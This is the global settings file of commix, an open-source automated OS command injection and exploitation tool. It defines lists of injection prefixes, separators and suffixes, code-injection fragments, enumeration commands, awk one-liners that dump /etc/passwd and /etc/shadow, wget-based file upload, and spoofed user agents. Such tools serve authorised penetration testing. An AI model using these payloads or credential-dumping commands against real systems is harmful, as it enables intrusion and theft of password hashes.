#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'doc/COPYING' for copying permission.
"""

import os
import sys
import urllib

"""
 The global variables.
"""

# About
APPLICATION = "commix"
DESCRIPTION = "Automated All-in-One OS Command Injection and Exploitation Tool"
AUTHOR  = "Anastasios Stasinopoulos"
VERSION = "v0.1b"
YEAR    = "2015"
TWITTER = "@ancst" 

# Inject Tag
INJECT_TAG = "INJECT_HERE"

# Check Commit ID
if os.path.isdir("./.git"):
  with open('.git/refs/heads/master', 'r') as f:
    COMMIT_ID = "-" + f.readline()[0:7]
else:
    COMMIT_ID = "-" + "NonGit"
    
# Output Directory
OUTPUT_DIR = ".output/"  

# Output file name
OUTPUT_FILE_NAME = "logs"

# Output file name
OUTPUT_FILE_EXT = ".txt"

OUTPUT_FILE = OUTPUT_FILE_NAME + OUTPUT_FILE_EXT

# The command injection prefixes.
PREFIXES = ["","'","\"","|","&","%27","%22","%7C","%26"] 

# The command injection separators.
SEPARATORS = [""," ",";","&","|","||","&&","%0a","%3B","%26","%26%26","%7C","%7C%7C"]

# The command injection suffixes.
SUFFIXES = ["","'","\"","#","//","\\\\","&","|","%27","%22","%5C%5C","%2F%2F","%26","%7C"]

# Bad combination of prefix and separator
JUNK_COMBINATION = ["&&&","|||","|&&","&|","&;","|;","%7C;","%26;","%7C&"]

# The code injection prefixes.
EVAL_PREFIXES = ["","'",")","')","\")","\".","'.",");}","');}","\");}"]

# The code injection separators.
EVAL_SEPARATORS = ["",";","%0a","\\\\n"]

# The code injection suffixes.
EVAL_SUFFIXES = ["","\\\\","//","#",".\"",".'"]

# The white-spaces
WHITESPACES = ["%20","$IFS"]

# Time delay
DELAY = 1

# Default Temp Directorya
TMP_PATH = "/tmp/"

# Default Server's Root Directory
SRV_ROOT_DIR = "/var/www/"
PASSWD_FILE = "/etc/passwd"
SHADOW_FILE = "/etc/shadow"

# The max help option length.
MAX_OPTION_LENGTH = 18

# Python version.
PYTHON_VERSION = sys.version.split()[0]

# Enumeration Commands
# Current user
CURRENT_USER = "whoami"

# The hostname
HOSTNAME = "hostname"

# Check if current user is root
ISROOT = "echo $(id -u)"

# Operation System.
RECOGNISE_OS = "uname -s"

# Hardware platform.
RECOGNISE_HP = "uname -m"

# /etc/passwd
SYS_USERS = "awk -F ':' '{ print $1\":\"$3\":\"$6\"(@)\"}' " + PASSWD_FILE
SYS_PASSES = "awk -F ':' '{ print $1\":\"$2\"(@)\"}' " + SHADOW_FILE 

# File System access options
# Read file
FILE_READ = "cat "

# Write file
FILE_WRITE = "echo "

# Write file
FILE_UPLOAD = "wget "

# Accepts YES,YE,Y,yes,ye,y
CHOISE_YES = ['yes','ye','y']

# Accepts NO,N,no,n
CHOISE_NO = ['no','n']

# Available alternative shells
AVAILABLE_SHELLS = ["python"]

# Available injectipon techniques
AVAILABLE_TECHNIQUES = [
        "classic","c",
        "eval-based","e",
        "time-based","t",
        "file-based","f",
]

# User Agent List
USER_AGENT_LIST = [
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/31.0",
        "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
        "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/31.0",
        # Oldies 
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)",
]

# Proxy Protocol
PROXY_PROTOCOL = "http"

# Privoxy Proxy
PRIVOXY_IP = "127.0.0.1"
PRIVOXY_PORT = "8118"

# Cookie injection
COOKIE_INJECTION = False

# User-Agent injection
USER_AGENT_INJECTION = False

# Valid URL format check
VALID_URL_FORMAT = "https?://(?:www)?(?:[\w-]{2,255}(?:\.\w{2,6}){1,2})(?:/[\w&%?#-]{1,300})?"

# Accepted shell menu options
SHELL_OPTIONS = ['?','quit','back']

# Cookie delimiter
COOKIE_DELIMITER = ";"

# Cookie delimiter
PARAMETER_DELIMITER = "&"

#eof
